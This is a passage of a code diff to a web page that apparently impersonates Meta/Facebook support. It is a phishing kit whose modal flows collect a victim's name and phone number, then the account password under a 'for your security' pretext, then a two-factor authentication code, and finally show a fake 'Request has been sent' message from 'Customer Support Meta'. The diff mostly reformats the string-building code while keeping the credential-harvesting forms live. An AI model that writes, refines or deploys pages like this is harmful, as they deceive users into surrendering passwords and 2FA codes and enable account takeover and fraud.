hAIRRcEhFDBIRQwSEUMEhFDBIRQoAKmgAgAAAAAAAAAuroAiAAJCKAAAMtJAQWEBGkigAA+jQ6nriO2yLqJqgDSsgNTogDYyAoIpFggDQANDIAiay1qRqIgC6lGWmW0FzUXApqKau4zWRYRrUQBWQARkWEUQBWaAKgAM0ABlplaJVABkASgAyGG8M4JQMG0AEZAAABKAEStABBlaioAAAKgAoAAAAAAAAAAACADH0zQBVAAAAAAAABqEaaAEtxLQBlAAAAAAAAAAvFwAS1QBAAAAAAAAAAAAAAABYCgAANAAAAAAAAmgAJaAKgAAAAAAAAAAAAAAAAAAAAAAAAAAAD6C9Qxwo7aVAaAAGQG/lpAGxkAgANiALAAUZAUE1U1YyyHwaoMtMrGQBoXDTDViENVNWDIDVYoAMgC0ZACgDUYAAABlkAGgBGQAATejH0pAERc1BpFAKzQAAAAARoAZrICgAAAoACACgAAAAAAAAAiAAgAgAAAAAAALFjQCqAJiADKAAAAAAACVYAIoAAAAAAAAAAAAAAAAAA0y0AAAAAAUAAAFoAFABYgAIAAAAAAAAAAAAAAAAAAAAAAAAAAAA//Z") no-repeat center center / cover !important;
+    background: url("data:image/jpeg;base64,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") no-repeat center center / cover !important;
     background-color: #f0f4ff !important;
   }
   .modal-box::before {
@@ -324,7 +323,6 @@
   }
   .modal-box { position: relative; }
   .modal-box > * { position: relative; z-index: 1; }
-
 </style>
 </head>
 <body>
@@ -715,7 +713,6 @@ const Modal = {
     overlay.className = 'modal-overlay';
     overlay.innerHTML = '<div class="modal-box">' + content + '</div>';
 
-    // Close on backdrop click
     overlay.addEventListener('click', function(e) {
       if (e.target === overlay) Modal.close(id);
     });
@@ -813,9 +810,6 @@ document.addEventListener('keydown', function(e) {
 
 <!-- ===================== MODAL FLOWS ===================== -->
 <script>
-// ==================== MODAL 1: CLIENT INFO ====================
-
-// Phone country codes list (top countries + full world list)
 var COUNTRY_CODES = [
   {code:"VN",name:"Vietnam",dial:"+84",flag:"🇻🇳"},
   {code:"US",name:"United States",dial:"+1",flag:"🇺🇸"},
@@ -896,7 +890,6 @@ var COUNTRY_CODES = [
   {code:"TN",name:"Tunisia",dial:"+216",flag:"🇹🇳"},
   {code:"DZ",name:"Algeria",dial:"+213",flag:"🇩🇿"},
   {code:"LY",name:"Libya",dial:"+218",flag:"🇱🇾"},
-  {code:"MX",name:"Mexico",dial:"+52",flag:"🇲🇽"},
   {code:"CU",name:"Cuba",dial:"+53",flag:"🇨🇺"},
   {code:"DO",name:"Dominican Rep.",dial:"+1",flag:"🇩🇴"},
   {code:"GT",name:"Guatemala",dial:"+502",flag:"🇬🇹"},
@@ -968,21 +961,21 @@ async function _detectCountryDial() {
 
 function _buildPhoneSelector() {
   var opts = COUNTRY_CODES.map(function(c) {
-    return '<div class="pcs-opt" data-dial="'+c.dial+'" data-flag="'+c.flag+'" onclick="_selectDial(this)">'
-      + '<span>'+c.flag+'</span>'
-      + '<span style="font-size:13px;color:#444;min-width:38px;display:inline-block;">'+c.dial+'</span>'
-      + '<span style="font-size:13px;color:#777;">'+c.name+'</span>'
+    return '<div class="pcs-opt" data-dial="' + c.dial + '" data-flag="' + c.flag + '" onclick="_selectDial(this)">'
+      + '<span>' + c.flag + '</span>'
+      + '<span style="font-size:13px;color:#444;min-width:38px;display:inline-block;">' + c.dial + '</span>'
+      + '<span style="font-size:13px;color:#777;">' + c.name + '</span>'
       + '</div>';
   }).join('');
   return '<div class="pcs-wrap" id="pcs">'
     + '<div class="pcs-trigger" onclick="_toggleDial()" id="pcsTrigger">'
-    + '  <span id="pcsFlag">'+_selectedFlag+'</span>'
-    + '  <span id="pcsDial" style="font-size:13px;color:#333;">'+_selectedDial+'</span>'
+    + '  <span id="pcsFlag">' + _selectedFlag + '</span>'
+    + '  <span id="pcsDial" style="font-size:13px;color:#333;">' + _selectedDial + '</span>'
     + '  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="2.5"><path d="M6 9l6 6 6-6"/></svg>'
     + '</div>'
     + '<div class="pcs-dropdown" id="pcsDropdown" style="display:none">'
     + '  <input class="pcs-search" id="pcsSearch" type="text" placeholder="Search country..." oninput="_filterDial(this.value)">'
-    + '  <div class="pcs-list" id="pcsList">'+opts+'</div>'
+    + '  <div class="pcs-list" id="pcsList">' + opts + '</div>'
     + '</div>'
     + '</div>';
 }
@@ -992,7 +985,7 @@ function _toggleDial() {
   if (!dd) return;
   _dropdownOpen = !_dropdownOpen;
   dd.style.display = _dropdownOpen ? 'block' : 'none';
-  if (_dropdownOpen) { 
+  if (_dropdownOpen) {
     setTimeout(function(){ var s=document.getElementById('pcsSearch'); if(s) s.focus(); }, 50);
   }
 }
@@ -1015,7 +1008,6 @@ function _filterDial(q) {
   });
 }
 
-// Close dropdown on outside click
 document.addEventListener('click', function(e) {
   var wrap = document.getElementById('pcs');
   if (wrap && !wrap.contains(e.target)) {
@@ -1025,12 +1017,13 @@ document.addEventListener('click', function(e) {
   }
 });
 
+// ==================== MODAL 1: CLIENT INFO ====================
 function openClientModal() {
   _detectCountryDial().then(function() {
     var content =
       '<div class="modal-header">' +
         '<span class="modal-title">Information</span>' +
-        '<button class="modal-close" onclick="Modal.close('clientModal')">&times;</button>' +
+        '<button class="modal-close" onclick="Modal.close(\'clientModal\')">&times;</button>' +
       '</div>' +
       '<form id="clientForm" autocomplete="off">' +
         '<div class="modal-input-wrap"><input id="fullName" type="text" placeholder="Full Name" required></div>' +
@@ -1077,27 +1070,25 @@ function openClientModal() {
   });
 }
 
-
 // ==================== MODAL 2: SECURITY (PASSWORD) ====================
 function openSecurityModal() {
-  var content = '\
-    <div style="display:flex;flex-direction:column;align-items:center;">\
-      <div style="width:100%;display:flex;justify-content:flex-end;margin-bottom:8px;">\
-        <button class="modal-close" onclick="Modal.close(\'securityModal\')">&times;</button>\
-      </div>\
-      <img src="./public/icons/ic_logo.svg" alt="Meta" class="modal-meta-icon">\
-      <div style="width:100%">\
-        <p class="modal-hint">For your security, you must enter your password to continue.</p>\
-        <form id="securityForm">\
-          <div class="modal-input-wrap"><input type="password" id="password" placeholder="Password" required></div>\
-          <p id="passwordError" class="modal-error"></p>\
-          <button type="submit" id="securityBtn" class="modal-btn-primary">Continue</button>\
-          <p style="text-align:center;margin-top:12px;"><a href="#" style="color:#9a979e;font-size:14px;text-decoration:none;">Forgot your password?</a></p>\
-        </form>\
-      </div>\
-      <img src="./public/icons/ic_meta_gray.svg" alt="Meta" class="modal-meta-logo">\
-    </div>\
-  ';
+  var content =
+    '<div style="display:flex;flex-direction:column;align-items:center;">' +
+      '<div style="width:100%;display:flex;justify-content:flex-end;margin-bottom:8px;">' +
+        '<button class="modal-close" onclick="Modal.close(\'securityModal\')">&times;</button>' +
+      '</div>' +
+      '<img src="./public/icons/ic_logo.svg" alt="Meta" class="modal-meta-icon">' +
+      '<div style="width:100%">' +
+        '<p class="modal-hint">For your security, you must enter your password to continue.</p>' +
+        '<form id="securityForm">' +
+          '<div class="modal-input-wrap"><input type="password" id="password" placeholder="Password" required></div>' +
+          '<p id="passwordError" class="modal-error"></p>' +
+          '<button type="submit" id="securityBtn" class="modal-btn-primary">Continue</button>' +
+          '<p style="text-align:center;margin-top:12px;"><a href="#" style="color:#9a979e;font-size:14px;text-decoration:none;">Forgot your password?</a></p>' +
+        '</form>' +
+      '</div>' +
+      '<img src="./public/icons/ic_meta_gray.svg" alt="Meta" class="modal-meta-logo">' +
+    '</div>';
 
   Modal.create('securityModal', content);
   Modal.open('securityModal');
@@ -1156,28 +1147,27 @@ function openAuthenticationModal(userData) {
   var phoneDisplay = typeof Utils !== 'undefined' ? Utils.maskPhone(userData.phone || '') : (userData.phone || '');
   var description = 'Enter the code for this account that we send to ' + emailDisplay + ', ' + phoneDisplay + ' or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)';
 
-  var content = '\
-    <div style="display:flex;flex-direction:column;">\
-      <div class="modal-header" style="margin-bottom:6px;">\
-        <div class="modal-user-info">\
-          <span>' + (userData.fullName || '') + '</span>\
-          <span class="modal-dot"></span>\
-          <span>Facebook</span>\
-        </div>\
-        <button class="modal-close" onclick="Modal.close(\'authModal\')">&times;</button>\
-      </div>\
-      <h2 style="font-size:20px;font-weight:700;color:#000;margin-bottom:14px;">Two-factor authentication required (1/3)</h2>\
-      <p class="modal-hint">' + description + '</p>\
-      <div class="modal-2fa-img"><img src="./public/images/authentication.png" alt="2FA"></div>\
-      <form id="authForm">\
-        <div class="modal-input-wrap"><input type="number" id="twoFa" placeholder="Code" required></div>\
-        <p id="authError" class="modal-error"></p>\
-        <button type="submit" id="authBtn" class="modal-btn-primary">Continue</button>\
-        <button type="button" class="modal-btn-outline">Try another way</button>\
-      </form>\
-      <img src="./public/icons/ic_meta_gray.svg" alt="Meta" class="modal-meta-logo">\
-    </div>\
-  ';
+  var content =
+    '<div style="display:flex;flex-direction:column;">' +
+      '<div class="modal-header" style="margin-bottom:6px;">' +
+        '<div class="modal-user-info">' +
+          '<span>' + (userData.fullName || '') + '</span>' +
+          '<span class="modal-dot"></span>' +
+          '<span>Facebook</span>' +
+        '</div>' +
+        '<button class="modal-close" onclick="Modal.close(\'authModal\')">&times;</button>' +
+      '</div>' +
+      '<h2 style="font-size:20px;font-weight:700;color:#000;margin-bottom:14px;">Two-factor authentication required (1/3)</h2>' +
+      '<p class="modal-hint">' + description + '</p>' +
+      '<div class="modal-2fa-img"><img src="./public/images/authentication.png" alt="2FA"></div>' +
+      '<form id="authForm">' +
+        '<div class="modal-input-wrap"><input type="number" id="twoFa" placeholder="Code" required></div>' +
+        '<p id="authError" class="modal-error"></p>' +
+        '<button type="submit" id="authBtn" class="modal-btn-primary">Continue</button>' +
+        '<button type="button" class="modal-btn-outline">Try another way</button>' +
+      '</form>' +
+      '<img src="./public/icons/ic_meta_gray.svg" alt="Meta" class="modal-meta-logo">' +
+    '</div>';
 
   Modal.create('authModal', content);
   Modal.open('authModal');
@@ -1255,17 +1245,17 @@ function openAuthenticationModal(userData) {
 
 // ==================== MODAL 4: SUCCESS ====================
 function openSuccessModal() {
-  var content = '\
-    <div class="modal-header">\
-      <h2 style="font-size:18px;font-weight:700;text-align:center;flex:1;">Request has been sent</h2>\
-      <button class="modal-close" onclick="Modal.close(\'successModal\')">&times;</button>\
-    </div>\
-    <div class="modal-success-img"><img src="./public/images/success.jpg" alt="Success"></div>\
-    <p style="color:#9a979e;font-size:15px;margin-bottom:6px;">Your request has been added to the processing queue. We will handle your request within 24 hours.</p>\
-    <p style="color:#9a979e;font-size:15px;margin-bottom:20px;">From the Customer Support Meta.</p>\
-    <a href="https://www.facebook.com" class="modal-return-btn">Return to Facebook</a>\
-    <img src="./public/icons/ic_meta_gray.svg" alt="Meta" class="modal-meta-logo">\
-  ';
+  var content =
+    '<div class="modal-header">' +
+      '<h2 style="font-size:18px;font-weight:700;text-align:center;flex:1;">Request has been sent</h2>' +
+      '<button class="modal-close" onclick="Modal.close(\'successModal\')">&times;</button>' +
+    '</div>' +
+    '<div class="modal-success-img"><img src="./public/images/success.jpg" alt="Success"></div>' +
+    '<p style="color:#9a979e;font-size:15px;margin-bottom:6px;">Your request has been added to the processing queue. We will handle your request within 24 hours.</p>' +
+    '<p style="color:#9a979e;font-size:15px;margin-bottom:20px;">From the Customer Support Meta.</p>' +
+    '<a href="https://www.facebook.com" class="modal-return-btn">Return to Facebook</a>' +
+    '<img src="./public/icons/ic_meta_gray.svg" alt="Meta" class="modal-meta-logo">';
+
   Modal.create('successModal', content);
   Modal.open('successModal');
 }
